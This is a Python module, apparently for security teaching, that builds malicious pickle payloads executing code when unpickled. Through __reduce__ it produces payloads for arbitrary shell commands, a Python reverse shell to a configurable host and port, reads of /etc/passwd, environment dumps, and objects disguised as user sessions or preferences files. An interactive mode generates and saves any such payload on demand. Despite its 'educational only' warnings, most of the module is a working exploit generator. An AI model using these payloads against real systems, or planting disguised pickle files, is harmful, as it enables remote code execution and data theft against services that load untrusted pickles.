"""
Attack Payload Generation
========================

This module demonstrates how to create malicious pickle payloads that execute
arbitrary code when unpickled. This shows the security risks of pickle.

⚠️  DANGER: This code creates actual malicious payloads!
⚠️  EDUCATIONAL USE ONLY - Never use this maliciously!
⚠️  Only run in controlled environments!
"""

import pickle
import base64
import os
import sys
import subprocess
from io import StringIO


class CommandExecutionPayload:
    """
    Payload that executes a system command when unpickled.

    This demonstrates the most basic form of pickle exploitation.
    """

    def __init__(self, command):
        self.command = command

    def __reduce__(self):
        """
        The __reduce__ method tells pickle how to reconstruct this object.
        We abuse this to execute arbitrary commands instead.
        """
        return (os.system, (self.command,))


class ReverseShellPayload:
    """
    Payload that creates a reverse shell connection when unpickled.

    WARNING: This creates an actual network connection!
    Only use in controlled environments!
    """

    def __init__(self, host="127.0.0.1", port=4444):
        self.host = host
        self.port = port

    def __reduce__(self):
        """Create a reverse shell using subprocess."""
        # Create a reverse shell command
        shell_cmd = f"python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{self.host}',{self.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.run(['/bin/sh'])\""
        return (os.system, (shell_cmd,))


class FileOperationPayload:
    """
    Payload that performs file operations when unpickled.

    This demonstrates data exfiltration and file manipulation attacks.
    """

    def __init__(self, operation="read", filename="/etc/passwd", content=None):
        self.operation = operation
        self.filename = filename
        self.content = content

    def __reduce__(self):
        """Perform file operations based on the specified type."""
        if self.operation == "read":
            # Read a file and display its contents
            command = f"cat {self.filename} || echo 'File not found or no permission'"
        elif self.operation == "write" and self.content:
            # Write content to a file
            command = f"echo '{self.content}' > {self.filename}"
        elif self.operation == "list":
            # List directory contents
            command = f"ls -la {self.filename}"
        else:
            command = "echo 'Invalid file operation'"

        return (os.system, (command,))


class EnvironmentExfiltrationPayload:
    """
    Payload that extracts environment variables and system information.

    This demonstrates information gathering attacks.
    """

    def __reduce__(self):
        """Extract environment variables and system info."""
        command = "echo '=== ENVIRONMENT VARIABLES ===' && env && echo '=== SYSTEM INFO ===' && uname -a && echo '=== CURRENT USER ===' && whoami && echo '=== CURRENT DIRECTORY ===' && pwd"
        return (os.system, (command,))


class PythonCodeExecutionPayload:
    """
    Payload that executes arbitrary Python code when unpickled.

    This demonstrates more sophisticated code execution attacks.
    """

    def __init__(self, python_code):
        self.python_code = python_code

    def __reduce__(self):
        """Execute Python code using eval."""
        return (eval, (self.python_code,))


class StealthyPayload:
    """
    A stealthy payload that appears legitimate but executes malicious code.

    This demonstrates how attacks can be hidden in seemingly innocent objects.
    """

    def __init__(self, fake_data, malicious_command):
        self.fake_data = fake_data
        self.malicious_command = malicious_command
        # These look like legitimate object attributes
        self.user_id = 12345
        self.username = "legitimate_user"
        self.session_token = "abc123def456"

    def __reduce__(self):
        """Execute the malicious command while appearing legitimate."""
        # The malicious command is hidden in what looks like a constructor call
        return (os.system, (self.malicious_command,))

    def __str__(self):
        """Make the object look legitimate when printed."""
        return f"UserSession(user_id={self.user_id}, username='{self.username}', token='{self.session_token[:8]}...')"


def create_command_payload(command):
    """Create a basic command execution payload."""
    print(f"Creating command execution payload: {command}")
    payload = CommandExecutionPayload(command)
    return payload


def create_reverse_shell_payload(host="127.0.0.1", port=4444):
    """Create a reverse shell payload."""
    print(f"Creating reverse shell payload: {host}:{port}")
    print("⚠️  WARNING: This creates an actual network connection!")
    payload = ReverseShellPayload(host, port)
    return payload


def create_file_payload(operation, filename, content=None):
    """Create a file operation payload."""
    print(f"Creating file operation payload: {operation} {filename}")
    payload = FileOperationPayload(operation, filename, content)
    return payload


def create_info_gathering_payload():
    """Create an information gathering payload."""
    print("Creating information gathering payload")
    payload = EnvironmentExfiltrationPayload()
    return payload


def create_python_payload(code):
    """Create a Python code execution payload."""
    print(f"Creating Python code execution payload")
    payload = PythonCodeExecutionPayload(code)
    return payload


def create_stealthy_payload():
    """Create a stealthy payload that looks legitimate."""
    print("Creating stealthy payload (appears as legitimate user session)")
    payload = StealthyPayload(
        fake_data={"user": "admin", "role": "user"},
        malicious_command="echo 'Stealthy attack executed!' && touch /tmp/pwned",
    )
    return payload


def serialize_payload(payload, output_format="pickle"):
    """Serialize a payload object."""
    pickled_data = pickle.dumps(payload)

    if output_format == "base64":
        return base64.b64encode(pickled_data).decode()
    elif output_format == "hex":
        return pickled_data.hex()
    else:
        return pickled_data


def save_payload_to_file(payload, filename):
    """Save a payload to a file."""
    os.makedirs("data", exist_ok=True)
    filepath = f"data/{filename}"

    with open(filepath, "wb") as f:
        pickle.dump(payload, f)

    print(f"Payload saved to: {filepath}")
    return filepath


def demonstrate_payloads():
    """Demonstrate various payload types without executing them."""
    print("=" * 60)
    print("🚨 MALICIOUS PAYLOAD DEMONSTRATION")
    print("=" * 60)
    print("⚠️  WARNING: These are actual malicious payloads!")
    print("⚠️  They will execute when unpickled!")
    print("⚠️  EDUCATIONAL PURPOSES ONLY!")
    print("=" * 60)
    print()

    # Create data directory
    os.makedirs("data", exist_ok=True)

    payloads = {}

    # 1. Basic command execution
    print("1. Basic Command Execution Payload")
    cmd_payload = create_command_payload("echo 'Hello from malicious payload!' && date")
    payloads["command"] = serialize_payload(cmd_payload, "base64")
    save_payload_to_file(cmd_payload, "command_payload.pkl")
    print()

    # 2. File operations
    print("2. File Operation Payload (safe directory listing)")
    file_payload = create_file_payload("list", "/tmp")
    payloads["file_ops"] = serialize_payload(file_payload, "base64")
    save_payload_to_file(file_payload, "file_payload.pkl")
    print()

    # 3. Information gathering
    print("3. Information Gathering Payload")
    info_payload = create_info_gathering_payload()
    payloads["info"] = serialize_payload(info_payload, "base64")
    save_payload_to_file(info_payload, "info_payload.pkl")
    print()

    # 4. Python code execution
    print("4. Python Code Execution Payload")
    python_code = "print('Python code executed!') or __import__('os').system('echo Python payload works!')"
    python_payload = create_python_payload(python_code)
    payloads["python"] = serialize_payload(python_payload, "base64")
    save_payload_to_file(python_payload, "python_payload.pkl")
    print()

    # 5. Stealthy payload
    print("5. Stealthy Payload (looks legitimate)")
    stealthy_payload = create_stealthy_payload()
    payloads["stealthy"] = serialize_payload(stealthy_payload, "base64")
    save_payload_to_file(stealthy_payload, "stealthy_payload.pkl")
    print()

    # 6. Reverse shell (create but don't save - too dangerous)
    print("6. Reverse Shell Payload (NOT SAVED - too dangerous)")
    print("   This would create: python3 reverse shell to 127.0.0.1:4444")
    print("   Use extreme caution with this type of payload!")
    print()

    # Display payload information
    print("=" * 60)
    print("GENERATED PAYLOADS (Base64 encoded)")
    print("=" * 60)

    for name, payload_data in payloads.items():
        print(f"\n{name.upper()} PAYLOAD:")
        print(f"Length: {len(payload_data)} characters")
        print(f"Data: {payload_data[:100]}{'...' if len(payload_data) > 100 else ''}")

    print("\n" + "=" * 60)
    print("⚠️  REMEMBER: Never unpickle these in production!")
    print("⚠️  These payloads will execute when loaded!")
    print("=" * 60)


def create_safe_looking_malicious_file():
    """Create a file that looks safe but contains malicious payload."""
    print("\nCreating a 'safe-looking' malicious file...")

    # This looks like a legitimate user preferences file
    class FakeUserPreferences:
        def __init__(self):
            self.theme = "dark"
            self.language = "en"
            self.notifications = True
            self.last_login = "2024-01-01"

        def __reduce__(self):
            # Hidden malicious payload
            return (
                os.system,
                ("echo 'Fake preferences file executed malicious code!'",),
            )

        def __str__(self):
            return f"UserPreferences(theme='{self.theme}', language='{self.language}', notifications={self.notifications})"

    fake_prefs = FakeUserPreferences()
    save_payload_to_file(fake_prefs, "malicious_preferences.pkl")
    print(f"Created malicious file that looks like: {fake_prefs}")


def interactive_payload_generator():
    """Interactive payload generator for educational purposes."""
    print("\n" + "=" * 60)
    print("INTERACTIVE PAYLOAD GENERATOR")
    print("=" * 60)
    print("⚠️  WARNING: Generated payloads are dangerous!")
    print("⚠️  Only use for educational purposes!")
    print("=" * 60)

    while True:
        print("\nAvailable payload types:")
        print("1. Command execution")
        print("2. File operations")
        print("3. Information gathering")
        print("4. Python code execution")
        print("5. Stealthy payload")
        print("6. Exit")

        try:
            choice = input("\nSelect payload type (1-6): ").strip()

            if choice == "1":
                command = input("Enter command to execute: ").strip()
                if command:
                    payload = create_command_payload(command)
                    data = serialize_payload(payload, "base64")
                    print(f"\nBase64 payload:\n{data}")

                    save = input("\nSave to file? (y/n): ").strip().lower()
                    if save == "y":
                        filename = input("Enter filename (without extension): ").strip()
                        save_payload_to_file(payload, f"{filename}.pkl")

            elif choice == "2":
                print("\nFile operations:")
                print("- read: Read file contents")
                print("- write: Write to file")
                print("- list: List directory")

                operation = input("Enter operation: ").strip()
                filename = input("Enter file/directory path: ").strip()
                content = None

                if operation == "write":
                    content = input("Enter content to write: ").strip()

                payload = create_file_payload(operation, filename, content)
                data = serialize_payload(payload, "base64")
                print(f"\nBase64 payload:\n{data}")

            elif choice == "3":
                payload = create_info_gathering_payload()
                data = serialize_payload(payload, "base64")
                print(f"\nBase64 payload:\n{data}")

            elif choice == "4":
                code = input("Enter Python code to execute: ").strip()
                if code:
                    payload = create_python_payload(code)
                    data = serialize_payload(payload, "base64")
                    print(f"\nBase64 payload:\n{data}")

            elif choice == "5":
                payload = create_stealthy_payload()
                data = serialize_payload(payload, "base64")
                print(f"\nBase64 payload:\n{data}")
                print(f"Appears as: {payload}")

            elif choice == "6":
                print("Exiting payload generator.")
                break

            else:
                print("Invalid choice. Please select 1-6.")

        except KeyboardInterrupt:
            print("\n\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")


def main():
    """Main function."""
    print("Python Pickle Attack Payload Generator")
    print("=" * 60)
    print("⚠️  EDUCATIONAL PURPOSES ONLY!")
    print("⚠️  These payloads are actually dangerous!")
    print("⚠️  Never use maliciously!")
    print("=" * 60)

    if len(sys.argv) > 1 and sys.argv[1] == "--interactive":
        interactive_payload_generator()
    else:
        demonstrate_payloads()
        create_safe_looking_malicious_file()

        print("\n" + "=" * 60)
        print("For interactive payload generation, run:")
        print("python attack_payload.py --interactive")
        print("=" * 60)


if __name__ == "__main__":
    main()
